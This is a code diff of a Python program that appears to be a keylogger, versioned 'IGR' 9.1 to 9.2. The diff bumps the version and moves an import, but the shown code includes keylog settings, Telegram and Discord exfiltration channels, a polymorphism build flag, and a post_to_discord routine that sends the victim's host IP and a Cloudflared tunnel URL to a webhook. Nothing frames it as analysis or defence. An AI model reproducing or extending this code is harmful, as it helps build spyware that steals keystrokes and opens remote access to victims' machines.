@@ -11,7 +11,7 @@ TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
 UPDATE_URL = "BUILD_UPDATE_URL"
 KEYLOG_ENCRYPTION_KEY = "BUILD_ENCRYPTION_KEY"
-IGR_VERSION = "9.1"
+IGR_VERSION = "9.2"
 
 # feature flags set during build
 FEAT_POLYMORPHISM = "BUILD_FEAT_POLYMORPHISM"
@@ -342,7 +342,6 @@ _FEAT_STATE_FILE = os.path.join(KEYLOG_DIR, ".feat_state.json")
 def _save_feat_state():
     """Save current feature flag values to disk."""
     try:
-        import json
         state = {}
         for attr, val in globals().items():
             if attr.startswith('FEAT_'):
@@ -355,7 +354,6 @@ def _save_feat_state():
 def _load_feat_state():
     """Load saved feature flags from disk, overriding defaults."""
     try:
-        import json
         if not os.path.exists(_FEAT_STATE_FILE):
             return
         with open(_FEAT_STATE_FILE, 'r') as f:
@@ -368,6 +366,7 @@ def _load_feat_state():
 
 _load_feat_state()
 
+import json
 import time
 import base64
 import threading
@@ -7872,7 +7871,6 @@ def find_free_port() -> int:
 def post_to_discord(url: str) -> bool:
     """Post the Cloudflared URL to Discord webhook."""
     try:
-        # Get host IP
         host_ip = "Unknown"
         try:
             hostname = socket.gethostname()
@@ -7883,12 +7881,10 @@ def post_to_discord(url: str) -> bool:
                     break
         except:
             pass
-        
         data = {
             "content": f"IGR - {host_ip}\n{url}",
             "username": DISCORD_USERNAME
         }
-        
         response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=10)
         response.raise_for_status()
         return True
